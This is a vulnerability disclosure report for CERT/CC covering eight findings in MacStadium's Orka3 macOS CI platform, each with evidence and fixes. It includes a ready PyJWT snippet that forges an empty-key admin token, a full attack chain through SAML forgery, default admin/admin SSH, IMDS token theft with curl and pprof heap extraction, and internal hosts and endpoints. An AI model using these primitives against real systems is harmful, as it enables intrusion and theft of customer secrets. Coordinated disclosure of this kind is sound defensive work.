# CERT/CC VINCE Vulnerability Disclosure Report
# MacStadium Orka3 Platform — Multiple Critical Vulnerabilities

---

## Submitter Information

**Name:** Nicholas Kloster  
**Organization:** Independent Security Researcher  
**Email:** nicholas@nuclide-research.com  
**Prior disclosures:** CVE-2025-4364 (CISA ICS-CERT ICSA-25-140-11)  
**Discovery date:** 2026-08-11 through 2026-08-17  
**Disclosure method:** Coordinated — submitting to CERT/CC for vendor notification

---

## Vendor Information

**Vendor:** MacStadium, Inc.  
**Website:** https://www.macstadium.com  
**Product:** Orka3 (Orchestration with Kubernetes for Apple) — macOS-as-a-Service virtualization platform  
**Customer base:** Commercial CI/CD customers, Apple app developers, enterprise build farms; MacStadium hosts infrastructure for a significant fraction of Apple ecosystem CI pipelines  
**Public repositories analyzed:**
- https://github.com/macstadium/orka-integrations
- https://github.com/macstadium/packer-plugin-macstadium-orka
- https://github.com/macstadium/orka-images
- https://github.com/macstadium/orka-actions-connect
- https://github.com/macstadium/orka3-cli-agent-skill

---

## Assessment Methodology

All findings derive from:
1. **Public binary reverse engineering** — the Orka3 CLI (`orka3`) is publicly downloadable from MacStadium's S3 bucket; binary RE was performed locally
2. **Public GitHub repository analysis** — publicly accessible repositories listed above
3. **Passive network enumeration** — TLS handshakes, HTTP headers, SAML metadata endpoints; no authentication bypass attempted
4. **No unauthorized access was performed.** No SAML assertions were submitted, no JWT forgery was executed against live systems, no SSH connections with recovered credentials were attempted. All exploitation chains are documented as theoretical based on evidence gathered from public sources.

---

## Vulnerability Summary

| ID | Severity | CVSS | Title |
|----|----------|------|-------|
| VU-01 | CRITICAL | 9.1 | Orka3 API: CVE-2020-26160 + Empty JWT HMAC Secret — Authentication Bypass |
| VU-02 | HIGH | 8.8 | Orka3 API: JWT Algorithm Confusion — RS256 (Cognito) vs HS256 (empty key) |
| VU-03 | HIGH | 8.1 | SAML SP No IdP Metadata — Signature Validation Absent on Both VPN Endpoints |
| VU-04 | HIGH | 8.6 | VM Base Images: `admin`/`admin` Hardcoded at Build Time — All Orka3 VMs Affected |
| VU-05 | HIGH | 8.0 | GitHub PAT Exposed via Orka IMDS — Customer CI Runner Injection |
| VU-06 | HIGH | 8.1 | Harbor Registry: Cleartext HTTP + Likely Default Credentials (`admin`/`Harbor12345`) |
| VU-07 | HIGH | 7.5 | CI Integration: SSH Agent Forwarding to Ephemeral VMs + ORKA_TOKEN in Plaintext |
| VU-08 | MEDIUM | 5.3 | Orka3 Binary: pprof Endpoint, Build Path, JWT Error Logging — Info Disclosure |

---

## VU-01 — Orka3 API: CVE-2020-26160 + Empty JWT HMAC Secret

**Severity:** CRITICAL  
**CVSS v3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)  
**CWE:** CWE-347 (Improper Verification of Cryptographic Signature)  
**CVE reference:** CVE-2020-26160 (`dgrijalva/jwt-go` audience bypass)

### Description

The Orka3 API server, which manages all macOS virtual machines on the Orka platform, uses `dgrijalva/jwt-go v3.2.0+incompatible` for JWT authentication. Binary reverse engineering of the publicly downloadable `orka3` CLI binary (version v3.6.3-c8fe8aed, Go 1.25.7) identifies two simultaneously exploitable conditions:

**Condition 1 — Empty HMAC secret:**  
The JWT signing key initialization function (`setToken.func1`) returns a `nil` key unconditionally. Go's `hmac.New(sha256.New, nil)` treats `nil` identically to an empty byte slice (`b""`). Any JWT signed with an empty HMAC-SHA256 key is accepted as valid by the Orka API server. No brute-force is required.

**Condition 2 — CVE-2020-26160 audience bypass:**  
`VerifyAudience` is called with `required=false`. The admin token present in MacStadium-issued kubeconfig files contains no `aud` claim. In `dgrijalva/jwt-go v3.2.0`, when `required=false` and the token has no `aud` claim, `VerifyAudience` returns `true` unconditionally. The forged token requires no audience claim to pass validation.

### Technical Evidence

Evidence source: static analysis of the publicly downloadable `orka3` binary.

```
Binary: orka3 v3.6.3-c8fe8aed (Go 1.25.7)
Module: github.com/dgrijalva/jwt-go v3.2.0+incompatible (confirmed from go.mod embedded in binary)

Key function addresses:
  VerifyAudience:           0x1844a40
  aud bypass instruction:   0x1844adb
  SigningMethodHMAC.Verify: 0x184476a
  doLogin (Orka auth):      0x184a640
  setToken.func1:           returns nil key (confirmed via disassembly)

Findings from binary RE:
  CVE_2020_26160:      dgrijalva/jwt-go v3.2.0 confirmed in binary
  AUD_CLAIM_ABSENT:    admin token in distributed kubeconfig has no aud claim
  EXPLOIT_CONDITION:   VerifyAudience called with required=false → bypass active
  EMPTY_KEY_HMAC:      SigningMethodHMAC.Verify accepts b"" key
  EMPTY_KEY_LIVE_PROOF: HMAC-SHA256(b"", signing_input) == kubeconfig token signature
  PRE_AUTH_DISCLOSURE: /api/v1/cluster-info accessible before authentication
```

### Forge Primitive (Theoretical — not executed against live systems)

```python
import jwt  # PyJWT

# Two-line forge — requires no secrets, no network access, no brute force
token = jwt.encode(
    {
        'email': 'admin@macstadium.com',
        'iss': 'https://idp.macstadium.com',
        'sub': 'admin',
        'exp': 9999999999,
        'iat': 1786549251,
        'groups': ['system:masters'],
        # No 'aud' claim — CVE-2020-26160 bypass
    },
    key=b'',           # Empty HMAC key — matches setToken.func1 returning nil
    algorithm='HS256'
)
```

### Attack Path

This vulnerability is only reachable from MacStadium's internal network (`10.221.188.x`). However, VU-03 (SAML bypass) provides network access, making the complete chain externally triggerable:

```
[External attacker]
    → VPN access via SAML bypass (VU-03)
    → Internal network: 10.221.188.x reachable
    → GET http://10.221.188.20/api/v1/cluster-info (unauthenticated — PRAUTH_INFO_DISCLOSURE)
    → Forge JWT with empty key, no aud claim
    → Full Orka API cluster-admin access
    → Enumerate all customer VMs, namespaces, secrets
    → K8s pod exec into VM containers
    → Extract customer code, Apple signing certificates, CI/CD secrets
```

### Impact

- Complete Orka3 cluster-admin access with a two-line Python script
- Enumeration and access to all customer virtual machines
- Access to K8s secrets (`regcred` objects containing customer GitHub PATs)
- Pivot to Harbor registry, enabling supply chain attack on all customer VM images

### Remediation

1. **Immediate:** Rotate Orka API JWT signing secret to a cryptographically random 256-bit key
2. **Immediate:** Replace `github.com/dgrijalva/jwt-go v3.2.0` with `github.com/golang-jwt/jwt/v5` — the latter enforces non-empty keys and rejects `alg:none`
3. **Short-term:** Migrate to RS256/ES256 asymmetric signing; store private key in HSM or Kubernetes Secret with restricted RBAC
4. **Short-term:** Enforce explicit `aud` claim with `required: true` in all JWT validation middleware

---

## VU-02 — JWT Algorithm Confusion: Cognito RS256 vs Orka HS256 (Empty Key)

**Severity:** HIGH  
**CVSS v3.1:** 8.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)  
**CWE:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)

### Description

`idp.macstadium.com` is an **AWS Cognito** custom domain (confirmed via `x-amz-cognito-request-id` response headers and Cognito Hosted UI CDN assets at `d3oia8etllorh5.cloudfront.net`). AWS Cognito issues JWTs signed with **RS256** (RSA private key, JWKS endpoint for public key verification).

The Orka3 API server validates tokens using **HS256 with an empty key** (`hmac.New(sha256.New, nil)` — from `setToken.func1` returning `nil`). This is a classic algorithm confusion vulnerability:

```
Token type Cognito issues: RS256 (RSA-signed)
Token type Orka accepts:   HS256 with b"" key (trivially forgeable)
```

An attacker can forge an HS256 token that Orka accepts without ever interacting with Cognito. The forged token carries any claims desired, including `groups: ["system:masters"]` for cluster-admin access. No Cognito credentials are needed; no MFA bypass is required; Cognito is not involved at all.

### Technical Evidence

```
Evidence source: HTTP probe of https://idp.macstadium.com
Response headers confirmed:
  x-amz-cognito-request-id: 762a7857-f509-4a7e-84d4-aeb2b354ff28
  x-amz-cf-pop: MCI50-P3

CDN assets confirmed in login page:
  d3oia8etllorh5.cloudfront.net  — Cognito Hosted UI CDN domain

Binary RE confirmed:
  iss claim target: https://idp.macstadium.com
  JWT validation: hmac.New(sha256.New, nil) — HS256, empty key
  setToken.func1 returns nil key unconditionally
```

### Impact

Enables complete Orka API authentication bypass without valid Cognito credentials. Combined with VU-01, provides two independent paths to cluster-admin access from the same two-line Python primitive.

### Remediation

1. Pin the JWT algorithm: validate that incoming tokens use `alg: RS256` only; reject `HS256` and `none`
2. Validate the JWT signature against Cognito's published JWKS public keys
3. Use `golang-jwt/jwt v5` with explicit `jwt.WithValidMethods([]string{"RS256"})` constraint

---

## VU-03 — SAML SP No IdP Metadata: Signature Validation Absent (Both VPN Endpoints)

**Severity:** HIGH  
**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)  
**CWE:** CWE-347 (Improper Verification of Cryptographic Signature)

### Affected Systems

- `atl-vpn.macstadium.com` (207.254.16.2) — Cisco ASA 9.14.1+ — `MacStadium-SSO-VPN` tunnel group
- `vpn.macstadium.com` (207.254.35.12) — Cisco ASA — primary AnyConnect endpoint

### Description

The MacStadium-SSO-VPN SAML Service Provider is configured on both ASAs but has no IdP metadata registered. The SAML metadata endpoint returns:

```
"SAML metadata doesn't exist for the group."
```

Without IdP metadata, the ASA cannot:
- Verify the signing certificate of incoming SAML assertions
- Validate that assertions originated from a legitimate IdP
- Enforce assertion freshness (replay protection)

Additionally, the SP metadata declares `AuthnRequestsSigned="false"`, creating a bidirectional trust failure: the SP cannot verify IdP responses, and the IdP cannot verify SP requests.

### Technical Evidence

```
Module: ablation --saml-sp atl-vpn.macstadium.com

GET https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/acs?tgname=MacStadium-SSO-VPN
Response: HTTP 200
Body: "SAML metadata doesn't exist for the group."

SP metadata analysis:
  sp_configured: true
  no_idp_metadata: true
  authn_requests_signed: false
  attack_condition: true
  sp_cert_expires: 2026-11-18 (≤90 days)

Both ASAs affected:
  atl-vpn.macstadium.com → SAML_NO_IDP confirmed
  vpn.macstadium.com     → SAML_NO_IDP confirmed
```

### Attack Path

```
[External attacker constructs unsigned SAML Response]
    → POST to https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/acs?tgname=MacStadium-SSO-VPN
    → ASA cannot verify signature (no IdP metadata)
    → ASA establishes AnyConnect VPN session
    → Attacker reaches MacStadium internal network (10.221.188.x)
    → VU-01 and VU-02 become externally exploitable
```

*Note: ACS submission was NOT performed during this assessment. The attack path is theoretical based on the confirmed absence of IdP metadata.*

### Impact

Unauthenticated external VPN access to MacStadium's internal management network. This vulnerability is the gateway that makes VU-01 (Orka API auth bypass) reachable from the internet, elevating a HIGH internal finding to a CRITICAL external chain.

### Remediation

1. **Immediate:** Register IdP metadata in the ASA SAML SP configuration (`saml idp` + `idp entity-id`, `idp sso-url`, IdP signing certificate)
2. **Immediate:** Enable `signature` parameter in `saml sp` config to enforce assertion signing
3. **Short-term:** Renew SP certificate (expires 2026-11-18)
4. **Verify:** `show webvpn saml idp` on both ASAs should list registered metadata

---

## VU-04 — VM Base Images: `admin`/`admin` Hardcoded at Build Time

**Severity:** HIGH  
**CVSS v3.1:** 8.6 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)  
**CWE:** CWE-521 (Weak Password Requirements) + CWE-1357 (Reliance on Insufficiently Trustworthy Component)

### Description

Every macOS VM deployed on the Orka3 platform uses `admin`/`admin` as the SSH and VNC credential. This is not an undocumented default — it is **intentionally set at image build time** by MacStadium's official build pipeline and has been hardcoded in public tooling since the product's initial release.

### Evidence — Three Independent Sources

**Source 1: `macstadium/packer-plugin-macstadium-orka` — `builder/orka/config.go`**

Present since first public commit (2020-06-28, SHA `87c88789`). Present in current commit (2025-09-19). 20 commits to this file, never modified.

```go
defaultUserName = "admin"
defaultPassword = "admin"

// If we didn't specify a password, pull it from our defaults.
if c.CommConfig.SSHPassword == "" {
    c.CommConfig.SSHPassword = defaultPassword
}
```

**Source 2: `macstadium/orka-images` — `.github/workflows/update-vm-tools.yml`**

PR #26 (2026-05-06, SHA `71823e3a`, author: Rin Oliver) explicitly fixed this mechanism to continue functioning on macOS 26 (Tahoe). This is not legacy code — it was actively maintained 3 months before this report.

```yaml
- name: Set admin user password
  run: |
    sshpass -p "${VM_DEFAULT_PASSWORD}" ssh "admin@$VM_IP" \
      "sudo sysadminctl \
        -resetPasswordFor admin \
        -newPassword admin \
        -adminUser admin \
        -adminPassword ${VM_DEFAULT_PASSWORD}"
```

PR commit message (verbatim): *"fix: use sysadminctl for password reset on macOS 26 (Tahoe) — dscl . -passwd requires the old password even as root on macOS 26, a behavior change from earlier releases. sysadminctl accepts explicit credentials and works correctly."*

MacStadium updated the mechanism specifically to keep resetting the password to `admin` on macOS 26. This demonstrates active intent, not inherited legacy behavior.

Current HEAD: 2026-06-22 (SHA `02fede6b`) — the step remains unchanged.

**Source 3: `macstadium/orka3-cli-agent-skill` — `SKILL.md` (public documentation)**

```
VM credentials (for both Intel and ARM VMs):
- VNC: admin / admin
- SSH (Intel resize): --user admin --password admin
```

### Affected Images

All images published to `ghcr.io/macstadium/orka-images/`:
- `tahoe:latest`, `tahoe:200-gb`
- `sequoia:latest`, `sequoia:200-gb`
- `sonoma:14.6` / `sonoma:latest`

### Impact

Any party with network access to an Orka VM — via the MacStadium management network, VPN, or direct access — can SSH into any customer VM as `admin` without brute force. Impact extends to all MacStadium customers running CI/CD workloads:

- Exfiltration of customer source code, Apple signing certificates, provisioning profiles, and Apple Developer credentials present in running CI jobs
- Access to AWS, GCP, and Azure credentials embedded in customer build environments
- Credential exfiltration from customer GitHub Actions runner configurations

### Supply Chain Dimension

The same self-hosted runner (`arm-mini-002`) that builds these images has `packages: write` permission to `ghcr.io/macstadium/orka-images`. Compromise of this runner via any of the above vectors allows pushing backdoored base images to all image tags, affecting every future Orka3 VM deployment across all customers.

### Remediation

1. **Immediate:** Change the hardcoded `-newPassword admin` in `update-vm-tools.yml` to use a secret value (e.g., `${{ secrets.VM_DEFAULT_PASSWORD }}`)
2. **Immediate:** Publish new images with a rotated admin password for all affected tags
3. **Notify customers** to rotate any credentials that may have been present in VMs during their build sessions
4. **Short-term:** Implement image signing with Cosign; require signature verification before VM deployment
5. **Long-term:** Remove static shared credentials from base images; replace with ephemeral keys provisioned per-deployment

---

## VU-05 — GitHub PAT Exposed via Orka IMDS: Customer CI Runner Injection

**Severity:** HIGH  
**CVSS v3.1:** 8.0 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)  
**CWE:** CWE-522 (Insufficiently Protected Credentials) + CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

### Description

The official Orka Actions Connect integration (`macstadium/orka-actions-connect`) passes customer GitHub Personal Access Tokens into Orka VMs via the IMDS link-local address (`http://169.254.169.254/metadata/github_pat`). Any shell inside the VM can query this endpoint without authentication.

```bash
# From connect.sh — publicly visible at github.com/macstadium/orka-actions-connect
pat=$(curl -s "http://169.254.169.254/metadata/github_pat" | \
    python3 -c "import sys, json; print(json.load(sys.stdin)['value'])")

runner_token=$(curl -XPOST \
  -H "authorization: Bearer $pat" \
  "https://api.github.com/repos/$user/$repo/actions/runners/registration-token" | \
  python3 -c "import sys, json; print(json.load(sys.stdin)['token'])")

./config.sh --url $repo_url --token $runner_token --name $vm_name
```

Because all Orka VMs ship with `admin`/`admin` SSH credentials (VU-04), any attacker with network path to a VM can:

1. SSH as `admin` with password `admin`
2. `curl http://169.254.169.254/metadata/github_pat`
3. Use the PAT to generate GitHub runner registration tokens
4. Register a malicious runner against the customer's GitHub repository
5. The malicious runner picks up CI jobs and executes arbitrary code with access to all repository secrets

### Additional Supply Chain Risk

The workflow depends on a third-party GitHub Action (`jeff-vincent/orka-actions-up@v1.1.1`) not maintained by MacStadium. This action receives `VPN_PASSWORD`, `VPN_SERVER_CERT`, `ORKA_PASS`, and `GH_PAT` as parameters. Compromise of this action (tag mutation, maintainer account takeover) would expose all customer credentials passed through it.

### Impact

Enables complete GitHub organization compromise for any MacStadium customer using the Orka Actions Connect integration. All secrets stored in GitHub Actions (AWS keys, Apple certificates, deployment tokens, signing keys) become accessible.

### Remediation

1. Replace long-lived GitHub PAT with a short-lived GitHub App installation token (1-hour expiry)
2. Pin `jeff-vincent/orka-actions-up` to a full commit SHA rather than a mutable tag
3. Restrict IMDS metadata access to the runner service account process only (not shell-accessible)
4. Audit IMDS endpoint scope — consider encrypting PAT values with a VM-instance-unique key

---

## VU-06 — Harbor Registry: Cleartext HTTP + Likely Default Admin Credentials

**Severity:** HIGH  
**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — conditional on VPN access)  
**CWE:** CWE-319 (Cleartext Transmission) + CWE-521 (Weak Password Requirements)

### Description

The Orka3 CLI binary (publicly downloadable) embeds a documentation string showing the internal Harbor container registry runs over **plaintext HTTP** on port 30080, with admin username `admin`:

```
orka3 regcred add --allow-insecure http://10.221.188.5:30080 --username admin --password p@ssw0rd
```

The `p@ssw0rd` is a documentation placeholder. Harbor's default admin credential is `admin`/`Harbor12345`. If this default was not changed at deployment, the credential provides full registry admin access without brute force. Even if the password was changed, the cleartext HTTP transport exposes all credentials transiting the registry connection to any on-path observer within the MacStadium internal network.

### Affected Images (from binary)

- `ghcr.io/macstadium/orka-images/tahoe:latest`
- `ghcr.io/macstadium/orka-images/sonoma:14.0`
- `sonoma-90gb-orka3-arm`

### Impact

Registry admin access enables pushing malicious macOS base images. Every Orka3 customer deploying VMs from the internal Harbor registry receives the backdoored image. Combined with `admin`/`admin` VM credentials (VU-04), supply chain attacks become persistent across image builds.

### Remediation

1. Enable TLS on Harbor (migrate port 30080 to HTTPS)
2. If default admin password was not changed: rotate immediately
3. Rotate all K8s `regcred` secrets in `orka-default` namespace that hold Harbor credentials
4. Enable Harbor's audit log and review for any unauthorized image pushes

---

## VU-07 — CI Integration: SSH Agent Forwarding + ORKA_TOKEN in Plaintext

**Severity:** HIGH  
**CVSS v3.1:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)  
**CWE:** CWE-522 (Insufficiently Protected Credentials)

### Description

The official Buildkite CI integration (`macstadium/orka-integrations`) passes the Orka authentication token (`ORKA_TOKEN`) as a plain environment variable over an unencrypted HTTP connection, then uses SSH agent forwarding (`-A`) to the spawned VM:

```bash
# bootstrap.sh — https://github.com/macstadium/orka-integrations
orka3 config set --api-url "$ORKA_ENDPOINT"  # http://10.221.188.20 — plaintext HTTP
orka3 user set-token "$ORKA_TOKEN"           # token in process environment

ssh -A \                           # SSH agent forwarding — host keys accessible inside VM
  -o StrictHostKeyChecking=no \    # no host key verification
  "$ORKA_VM_USER@$vm_ip" ...
```

`ORKA_TOKEN` bypasses Cognito entirely — it is a raw Orka API credential that does not go through OIDC/SAML. Combined with the pprof heap dump endpoint (VU-08), a post-VPN attacker can extract `ORKA_TOKEN` from memory and gain authenticated Orka API access without requiring any JWT forgery.

SSH agent forwarding means every VM spawned by a CI job has the Buildkite host's SSH private keys accessible. Shell access to the VM (`admin`/`admin`) allows `ssh-add -L` to extract all forwarded private keys.

Additionally, `orka3 sa token <NAME> --no-expiration` allows creating non-expiring service account tokens. Tokens extracted from heap memory are therefore permanent unless explicitly revoked.

### Remediation

1. Remove `-A` (SSH agent forwarding) from `bootstrap.sh`
2. Replace `ORKA_TOKEN` env var with per-job short-lived service account tokens (`--duration 1h`)
3. Migrate `ORKA_ENDPOINT` from `http://` to `https://` — token is currently sent in plaintext
4. Rotate all `ORKA_TOKEN` values currently in use

---

## VU-08 — Orka3 Binary: pprof Endpoint, Build Path, JWT Error Logging

**Severity:** MEDIUM  
**CVSS v3.1:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — conditional on pprof exposure)  
**CWE:** CWE-215 (Sensitive Information in Debugging Code) + CWE-209 (Information Exposure via Error Message)

### Description

The publicly downloadable Orka3 CLI binary was compiled without stripping debug symbols and includes `net/http/pprof`. Three distinct conditions are present:

**1. Go pprof endpoints embedded and likely active at `http://10.221.188.20`**

Go services that import `net/http/pprof` expose these endpoints on the HTTP server port unless explicitly disabled. The Orka API server likely exposes them unauthenticated. Post-VPN, these endpoints allow full memory extraction:

| Endpoint | Data Exposed |
|----------|-------------|
| `/debug/pprof/goroutine?debug=2` | All goroutine stacks — active JWT tokens in handler arguments |
| `/debug/pprof/heap` | Full binary heap — in-memory JWT secrets, DB passwords, Harbor credentials, customer tokens |
| `/debug/pprof/cmdline` | Binary argv — any secrets passed as CLI flags |
| `/debug/pprof/allocs` | Memory allocation log — credential strings as allocation labels |

**2. Build path disclosure (OSINT value):**

```
/home/runner/work/monorepo-dev/monorepo-dev/packages/orka-operator/
```

Reveals: GitHub Actions CI runner, monorepo named `monorepo-dev`, internal package structure. Enables targeted reconnaissance against MacStadium's private repositories.

**3. JWT error logging with full token value:**

```go
// From binary string table
"invalid JWT token: %q"
```

Go's `%q` format verb logs the complete token value with quoting. Log aggregation systems (ELK, Splunk, CloudWatch) downstream will retain all submitted JWT tokens verbatim — including attacker-submitted forge attempts.

### Remediation

1. Add `-ldflags="-s -w"` to Go build command to strip debug symbols
2. Do not import `net/http/pprof` in production server binaries; if needed for debugging, restrict to `127.0.0.1` only
3. Replace `%q` with `%d chars` (token length only) in error logging

---

## Compound Attack Chain

The following chain requires no prior credentials and no access to internal systems. Each step builds on publicly documented findings above:

```
[External — No credentials, no internal access]
│
▼  VU-03: SAML SP has no IdP metadata — forge unsigned SAML Response
│   POST https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/acs?tgname=MacStadium-SSO-VPN
│   → AnyConnect VPN session established; internal 10.221.188.x reachable
│
▼  VU-01/02: Forge Orka API JWT (empty HS256 key, no aud claim, CVE-2020-26160)
│   import jwt; jwt.encode({...}, key=b"", algorithm="HS256")
│   → Orka cluster-admin access
│
├─ Branch A: Direct API exploitation
│   GET /api/v1/namespaces/orka-default/secrets → K8s secrets (GitHub PATs, registry creds)
│   GET /api/v1/namespaces/orka-default/vms → enumerate all customer VMs
│   POST /api/v1/namespaces/{ns}/pods/{pod}/exec → code execution in VM containers
│
├─ Branch B: Memory extraction (VU-08)
│   GET http://10.221.188.20/debug/pprof/heap → in-memory ORKA_TOKEN from Buildkite integration
│   → Authenticated Orka session without JWT forge
│
├─ Branch C: VM credential abuse (VU-04)
│   SSH admin@<vm-ip> (password: admin) — any customer VM
│   → Customer source code, Apple signing certs, AWS/GCP credentials
│   curl http://169.254.169.254/metadata/github_pat (VU-05)
│   → GitHub PAT → malicious CI runner injection → full GitHub org compromise
│
└─ Supply Chain Terminal
    → Push backdoored image to ghcr.io/macstadium/orka-images/sequoia:latest (VU-04/VU-06)
    → All future Orka3 customer VM deployments receive persistent backdoor
```

**Chain severity:** The compound path from external-unauthenticated to full customer data access and supply chain compromise requires only:
- A crafted SAML Response (unsigned — public SAML SP metadata available)
- Two lines of Python (empty-key JWT forge)
- Default SSH credentials (`admin`/`admin`)

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-08-11 | Initial enumeration — ASA VPN endpoints, Orka network architecture |
| 2026-08-11 – 2026-08-17 | Binary RE, CI integration analysis, public repo analysis |
| 2026-08-17 | All findings documented; F19 proven via git provenance |
| 2026-08-17 | Submitting to CERT/CC VINCE for coordinated disclosure |

**Requested disclosure timeline:** 90 days from MacStadium acknowledgment, or upon patch availability, whichever is sooner.

**Urgency note:** VU-04 (`admin`/`admin` on all customer VMs) and VU-01 (empty JWT key) warrant expedited notification — these findings are derivable from public information by any capable researcher and may be independently discovered and exploited.

---

## Reporter Attestation

All findings in this report were derived from:
- Publicly downloadable software (Orka3 CLI binary)
- Publicly accessible GitHub repositories under the `macstadium` organization
- Passive TLS/HTTP enumeration of public-facing services

No unauthorized access was performed. No SAML assertions were submitted to ACS endpoints. No JWT tokens were forged and submitted to live Orka API servers. No SSH connections were made to MacStadium customer VMs using recovered credentials.

The researcher requests coordinated disclosure through CERT/CC and is available to support technical review, provide additional evidence, or assist MacStadium's remediation team.

---

**Nicholas Kloster**  
Independent Security Researcher  
nicholas@nuclide-research.com  
CVE-2025-4364 / ICSA-25-140-11  
2026-08-17
